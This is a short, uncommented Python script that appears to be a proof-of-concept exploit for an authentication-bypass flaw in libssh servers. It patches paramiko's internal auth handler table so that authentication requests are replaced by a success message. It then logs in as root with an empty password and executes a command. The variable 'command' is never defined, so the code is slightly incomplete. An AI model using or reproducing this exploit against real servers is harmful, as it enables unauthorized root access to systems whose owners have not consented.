import sys, paramiko, logging

new_auth_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_SUCCESS]

def auth_accept(*args, **kwargs): return new_auth_accept(*args, **kwargs)
 
paramiko.auth_handler.AuthHandler._handler_table.update({paramiko.common.MSG_USERAUTH_REQUEST: auth_accept,})

logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)

client = paramiko.SSHClient()

client.set_missing_host_key_policy(paramiko.WarningPolicy())

client.connect("127.0.0.1", port=2222, username="root", password="", pkey=None, key_filename="fake.key")

stdin, stdout, stderr = client.exec_command(command)

print(stdout.read(),)
